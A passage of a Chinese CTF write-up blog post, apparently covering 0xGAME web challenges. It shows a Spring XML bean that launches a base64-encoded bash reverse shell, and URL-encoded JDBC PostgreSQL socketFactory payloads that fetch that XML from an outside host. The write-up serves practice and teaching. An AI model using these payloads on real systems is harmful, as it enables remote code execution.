class="hljs-variable">%76</span><span class="hljs-variable">%5</span>a<span class="hljs-variable">%47</span><span class="hljs-variable">%56</span><span class="hljs-variable">%32</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%33</span><span class="hljs-variable">%52</span><span class="hljs-variable">%6</span>a<span class="hljs-variable">%63</span><span class="hljs-variable">%43</span><span class="hljs-variable">%39</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%62</span><span class="hljs-variable">%33</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%30</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%52</span><span class="hljs-variable">%76</span><span class="hljs-variable">%59</span><span class="hljs-variable">%32</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%63</span><span class="hljs-variable">%69</span><span class="hljs-variable">%35</span><span class="hljs-variable">%70</span><span class="hljs-variable">%62</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%52</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%35</span><span class="hljs-variable">%68</span><span class="hljs-variable">%62</span><span class="hljs-variable">%43</span><span class="hljs-variable">%38</span><span class="hljs-variable">%30</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%44</span><span class="hljs-variable">%51</span><span class="hljs-variable">%30</span><span class="hljs-variable">%49</span><span class="hljs-variable">%44</span><span class="hljs-variable">%41</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%4</span>a<span class="hljs-variable">%6</span>a<span class="hljs-variable">%45</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%7</span>d<span class="hljs-variable">%7</span><span class="hljs-keyword">c</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%62</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%36</span><span class="hljs-variable">%34</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%64</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%7</span><span class="hljs-keyword">c</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%62</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%69</span><span class="hljs-variable">%7</span>d&amp;password<span class="hljs-operator">=</span><span class="hljs-number">123</span></code></pre></div>
+</blockquote>
+<p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231123154925022.png" srcset="/img/loading.gif" lazyload alt="image-20231123154925022"></p>
+<h3 id="postgresql-驱动"><a href="#postgresql-驱动" class="headerlink" title="postgresql 驱动"></a>postgresql 驱动</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span>
+<span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span>
+<span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;</span></span>
+<span class="hljs-string"><span class="hljs-tag">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pb&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> &gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>bash<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+            <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span>
+            <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div>
+
+<p>payload</p>
+<div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/testConnection?driver=org.postgresql.Driver&amp;url=jdbc:postgresql:/</span><span class="hljs-regexp">/127.0.0.1:5432/</span>test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=http:<span class="hljs-regexp">//</span>host.docker.internal:<span class="hljs-number">8000</span>/poc.xml&amp;username=<span class="hljs-number">123</span>&amp;password=<span class="hljs-number">123</span></code></pre></div>
+
+<p>url 编码</p>
+<div class="code-wrapper"><pre><code class="hljs llvm">/testConnection?driver<span class="hljs-operator">=</span>org.postgresql.Driver&amp;url<span class="hljs-operator">=</span><span class="hljs-variable">%6</span>a<span class="hljs-variable">%64</span><span class="hljs-variable">%62</span><span class="hljs-variable">%63</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%70</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%67</span><span class="hljs-variable">%72</span><span class="hljs-variable">%65</span><span class="hljs-variable">%73</span><span class="hljs-variable">%71</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%2</span>f<span class="hljs-variable">%2</span>f<span class="hljs-variable">%31</span><span class="hljs-variable">%32</span><span class="hljs-variable">%37</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%30</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%30</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%31</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%35</span><span class="hljs-variable">%34</span><span class="hljs-variable">%33</span><span class="hljs-variable">%32</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%3</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>b<span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%46</span><span class="hljs-variable">%61</span><span class="hljs-variable">%63</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%79</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%67</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%73</span><span class="hljs-variable">%70</span><span class="hljs-variable">%72</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%66</span><span class="hljs-variable">%72</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%77</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>b<span class="hljs-variable">%2</span>e<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%73</span><span class="hljs-variable">%75</span><span class="hljs-variable">%70</span><span class="hljs-variable">%70</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%43</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%50</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%68</span><span class="hljs-variable">%58</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%41</span><span class="hljs-variable">%70</span><span class="hljs-variable">%70</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%63</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%43</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%74</span><span class="hljs-variable">%26</span><span class="hljs-variable">%73</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>b<span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%46</span><span class="hljs-variable">%61</span><span class="hljs-variable">%63</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%79</span><span class="hljs-variable">%41</span><span class="hljs-variable">%72</span><span class="hljs-variable">%67</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%68</span><span class="hljs-variable">%74</span><span class="hljs-variable">%74</span><span class="hljs-variable">%70</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%2</span>f<span class="hljs-variable">%2</span>f<span class="hljs-variable">%68</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%64</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>b<span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%38</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%78</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span>&amp;username<span class="hljs-operator">=</span><span class="hljs-number">123</span>&amp;password<span class="hljs-operator">=</span><span class="hljs-number">123</span></code></pre></div>
+
+<p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231123000646246.png" srcset="/img/loading.gif" lazyload alt="image-20231123000646246"></p>
+<h3 id="总结一下这两个方法"><a href="#总结一下这两个方法" class="headerlink" title="总结一下这两个方法"></a>总结一下这两个方法</h3><p>使用mysql的话注意 username 要单独传payload,</p>
+<p>两个方法都要注意的是，<code>url</code>的参数要全部进行<code>url</code>编码（注意是全部，每个字符都要）， 防止服务器错把 <code>autoDeserialize</code>, <code>queryInterceptors</code> 这些参数当成是一个 http get 参数, 而不是 jdbc url 里面的参数</p>
+<p>三篇参考文章还是非常推荐的，只不过我就大概看下结果吧，过程有点看不下去了</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>第二周开始就考的是对应知识点中较难的考点了，以前都没机会遇到</p>
+<p>第三周对于我来说已经接近小型比赛的题目难度了（其实就是很模糊，有点感觉但做不出来）</p>
+<p>第四周的java题没有考gadget，就是考各个的一些特性，然后后面两题就是考了依赖的漏洞，难度肯定是比考gadget要简单的，但确实不会，不一定搜的出来，难说啊，get不到考点</p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="https://exp10it.cn/2023/11/0xgame-2023-web-official-writeup/">https://exp10it.cn/2023/11/0xgame-2023-web-official-writeup/</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>0xGAME-WEB 复现</div>
+      <div>https://zer0peach.github.io/2023/11/21/0xGAME-WEB-复现/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zer0peach</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年11月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/20/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/" title="vm沙箱逃逸初识">
+                        <span class="hidden-mobile">vm沙箱逃逸初识</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <a href="https://zer0peach.github.io"><span>author:Zer0peach</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
